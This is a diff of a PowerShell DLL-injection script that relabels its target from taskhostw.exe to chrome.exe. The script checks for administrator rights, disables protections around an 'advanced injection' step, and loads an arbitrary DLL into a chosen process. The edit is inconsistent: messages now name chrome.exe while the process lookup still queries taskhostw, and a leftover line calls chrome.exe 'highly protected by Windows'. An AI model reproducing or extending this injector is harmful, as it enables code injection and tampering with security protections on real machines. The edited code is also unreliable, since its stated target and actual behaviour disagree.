@@ -1,4 +1,4 @@
-# MANUAL DLL INJECTION INTO TASKHOSTW.EXE
+# MANUAL DLL INJECTION INTO chrome.exe
 # Specifically targets chrome.exe processes
 
 param(
@@ -88,16 +88,16 @@ public class AdvancedInjector {
 "@
 
 function Find-TaskHostProcess {
-    Write-Host "`n🔍 SEARCHING FOR TASKHOSTW.EXE PROCESSES..." -ForegroundColor Yellow
+    Write-Host "`n🔍 SEARCHING FOR chrome.exe PROCESSES..." -ForegroundColor Yellow
     
     $taskhostProcesses = Get-Process -Name "taskhostw" -ErrorAction SilentlyContinue
     
     if ($taskhostProcesses.Count -eq 0) {
-        Write-Host "❌ No taskhostw.exe processes found!" -ForegroundColor Red
+        Write-Host "❌ No chrome.exe processes found!" -ForegroundColor Red
         return $null
     }
     
-    Write-Host "✓ Found $($taskhostProcesses.Count) taskhostw.exe process(es):" -ForegroundColor Green
+    Write-Host "✓ Found $($taskhostProcesses.Count) chrome.exe process(es):" -ForegroundColor Green
     
     for ($i = 0; $i -lt $taskhostProcesses.Count; $i++) {
         $proc = $taskhostProcesses[$i]
@@ -115,7 +115,7 @@ function Invoke-AdvancedInjection {
     param([int]$TargetPID, [string]$DllPath)
     
     Write-Host "`n🛠️  ADVANCED INJECTION STARTING..." -ForegroundColor Yellow
-    Write-Host "Target: taskhostw.exe (PID: $TargetPID)" -ForegroundColor Cyan
+    Write-Host "Target: chrome.exe (PID: $TargetPID)" -ForegroundColor Cyan
     Write-Host "DLL: $DllPath" -ForegroundColor Cyan
     
     $hProcess = [IntPtr]::Zero
@@ -276,7 +276,7 @@ function Enable-Protections {
 }
 
 # MAIN EXECUTION
-Write-Host "TASKHOSTW.EXE INJECTOR" -ForegroundColor Magenta
+Write-Host "chrome.exe INJECTOR" -ForegroundColor Magenta
 Write-Host "======================" -ForegroundColor Magenta
 
 $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
@@ -292,17 +292,17 @@ if (-not (Test-Path $DllPath)) {
 }
 Write-Host "✓ DLL exists: $DllPath" -ForegroundColor Green
 
-# Find and select taskhostw.exe process
+# Find and select chrome.exe process
 $targetProcess = Find-TaskHostProcess
 if ($null -eq $targetProcess) {
-    Write-Host "❌ No suitable taskhostw.exe process found!" -ForegroundColor Red
+    Write-Host "❌ No suitable chrome.exe process found!" -ForegroundColor Red
     exit 1
 }
 
 Disable-Protections
 
 Write-Host "`n" + "🚀"*30 -ForegroundColor Cyan
-Write-Host "STARTING ADVANCED INJECTION INTO TASKHOSTW.EXE..." -ForegroundColor Cyan
+Write-Host "STARTING ADVANCED INJECTION INTO chrome.exe..." -ForegroundColor Cyan
 Write-Host "🚀"*30 -ForegroundColor Cyan
 
 $success = Invoke-AdvancedInjection -TargetPID $targetProcess.Id -DllPath $DllPath
@@ -310,9 +310,9 @@ $success = Invoke-AdvancedInjection -TargetPID $targetProcess.Id -DllPath $DllPa
 Enable-Protections
 
 if ($success) {
-    Write-Host "`n🎉 SUCCESS! DLL injected into taskhostw.exe (PID: $($targetProcess.Id))" -ForegroundColor Green
+    Write-Host "`n🎉 SUCCESS! DLL injected into chrome.exe (PID: $($targetProcess.Id))" -ForegroundColor Green
     Write-Host "The DLL should now be loaded in the target process" -ForegroundColor Cyan
 } else {
-    Write-Host "`n❌ FAILED! Injection into taskhostw.exe was unsuccessful." -ForegroundColor Red
-    Write-Host "taskhostw.exe is highly protected by Windows." -ForegroundColor Yellow
+    Write-Host "`n❌ FAILED! Injection into chrome.exe was unsuccessful." -ForegroundColor Red
+    Write-Host "chrome.exe is highly protected by Windows." -ForegroundColor Yellow
 }
